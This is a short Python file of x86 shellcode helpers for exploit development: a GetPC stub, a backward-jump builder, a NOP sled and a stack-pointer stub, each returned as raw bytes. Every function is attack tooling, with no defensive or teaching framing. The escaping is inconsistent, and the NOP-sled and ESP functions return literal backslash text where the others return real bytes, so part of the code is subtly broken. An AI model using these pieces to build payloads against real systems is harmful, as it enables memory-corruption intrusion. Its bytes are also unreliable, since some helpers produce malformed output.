def get_where_am_i_in_ecx():
    # fldz
    # fnstenv [esp-12]
    # pop ecx
    # add cl, 9
    return "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x09"

# jumps is how many 256 bytes backword jump you want to take
def jmp_backwards_ecx(jumps=1):
    return get_where_am_i_in_ecx() + "\xfe\xcd" * jumps + "\xff\xe1"
    

def nop_sled(count=1):
    return "\\x90"*count

def get_esp_address_in_eax():
  # PUSH ESP
  # POP EAX
  return "\\x54\\x58"
